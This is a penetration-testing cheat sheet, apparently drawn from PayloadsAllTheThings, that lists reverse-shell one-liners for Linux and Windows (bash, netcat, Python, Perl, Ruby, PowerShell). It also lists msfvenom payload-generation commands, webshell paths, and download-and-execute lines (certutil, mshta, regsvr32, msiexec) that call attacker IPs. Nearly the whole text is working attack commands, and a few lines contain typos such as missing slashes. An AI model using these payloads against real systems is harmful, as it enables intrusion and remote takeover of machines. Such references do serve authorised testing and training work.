## Reference - Refererd from vaiours online sources PayloadAllTheThings


## INITIAL ENTRY 
````
JSP / tomcat WAR 
msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f war > java4444.war  
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.1 LPORT=4448 -f raw > w4448.jsp 

ASP /ASPX 
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f asp > shell.asp
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f aspx > shell.aspx

PHP 
<?php $cmd = shell_exec('bash -i >& /dev/tcp/10.10.10.14444 0>&1'); echo $cmd;?> 
<?php $cmd = shell_exec('cmd /c \\10.10.10.1\test\nc.exe -e cmd.exe 10.10.10.1 4444'); echo $cmd;?> 

````
#### WEBSHELLS
````
PHP 
/usr/share/webshells/php/simple-backdoor.php , paramter - cmd 

Cold FUsion 
/usr/share/webshells/cfm/cfexec.cfm

JSP 
/usr/share/webshells/jsp/jsp-reverse.jsp

ASP/ASPX
/usr/share/webshells/asp/
/usr/share/webshells/aspx/

Perl/CGI 
/usr/share/webshells/perl/perl-reverse-shell.pl
/usr/share/webshells/perl/perlcmd.cgi
````


## LINUX
#### COMON
````
bash -i >& /dev/tcp/10.10.10.1/4444 0>&1  

mknod backpipe p && nc 10.10.10.1 4445 0<backpipe | /bin/bash 1>backpipe 

mkfifo /tmp/f2;cat /tmp/f2|/bin/sh -i |nc 10.10.10.1 4444 >/tmp/f2 

nc -e /bin/bash 10.10.10.1 4444

````
#### MORE
````
php -r '$sock=fsockopen("10.10.16.1",4446);exec("/bin/sh -i <&3 >&3 2>&3");' 

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 

perl -e 'use Socket;$i="10.10.10.1";$p=4446;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' 

ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
````


## WINDOWS
#### COMON
````
\\192.168.119.155\test\nc.exe -e cmd.exe 192.168.1.1 4444

certutil -urlcache -f http://192.168.1.1/nc.exe nc.exe & nc.exe -e cmd.exe 192.168.1.1 4444

start /B \\192.168.1.1\test\nc.exe -e cmd.exe 192.168.1.1 4444 

start /B powershell.exe -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.9.51.179',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

start /B powershell -exec bypass -c "$sm=(New-Object Net.Sockets.TCPClient('10.9.51.179',4444)).GetStream();[byte[]]$bt=0..255|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}"

powershell -exec bypass -c "iwr('http://192.168.1.1Invoke-PowerShellTcp.ps1')|iex"

powershell -exec bypass -c "iex(New-Object Net.WebClient).DownloadString('http://192.168.1.1/Invoke-PowerShellTcp.ps1')"

NOT Tested 
powershell -NoP -NonI -W Hidden -Exec Bypass "& {$ps=$false;$hostip='192.168.xxx.xxx';$port=xxxx;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}" 

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.XXX.XXX/powercat.ps1');powercat -c 192.168.XXX.XXX -p 443 -e cmd"

````
#### MORE
````
certutil -urlcache -f http://192.168.1.1/shell.exe shell.exe & shell.exe 

mshta.exe http://192.168.1.109:8080/5EEiDSd70ET0k.hta 

rundll32.exe \\192.168.1.109\vabFG\test.dll,0 

regsvr32 /s /n /u /i:http://192.168.1.1:8080/xo31Jt5dIF.sct scrobj.dll 

powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/1.bat'))" 

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.1 lport=1234 -f msi > 1.msi 
msiexec /q /i http://192.168.1.1/1.msi 

````


## MSFVENOM

Ref -  https://netsec.ws/?p=331 
 
````
Listener  
msfconsole -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost tun0; set lport 4445; run -j" 

UnStaged 

msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf  
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe 

Staged  

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf   
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe 

Unstaged size restricted 
msfvenom -p windows/exec CMD=calc.exe -b "x00" -f py
````
